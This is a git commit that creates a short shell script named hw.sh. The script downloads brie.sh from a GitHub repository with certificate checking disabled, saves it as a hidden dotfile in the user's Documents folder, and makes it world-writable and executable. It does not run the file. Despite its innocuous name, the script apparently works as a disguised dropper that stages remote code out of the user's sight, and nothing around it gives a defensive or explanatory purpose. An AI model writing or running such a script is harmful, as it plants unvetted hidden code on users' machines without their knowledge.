baf5f8bb7fd06941e997d276fa508a1f181f1a02
hLbx0 <90946073+hLbx0@users.noreply.github.com>
2023-06-17 07:43:32 -0400

    Create hw.sh

---
+++ hw.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+HOME__="/home/$USER/Documents/"
+wget --no-check-certificate --no-cache --no-cookies https://github.com/hLbx0/IBS/raw/main/brie.sh -O "$HOME__".brie.sh
+chmod 777 "$HOME__".brie.sh
+exit 0
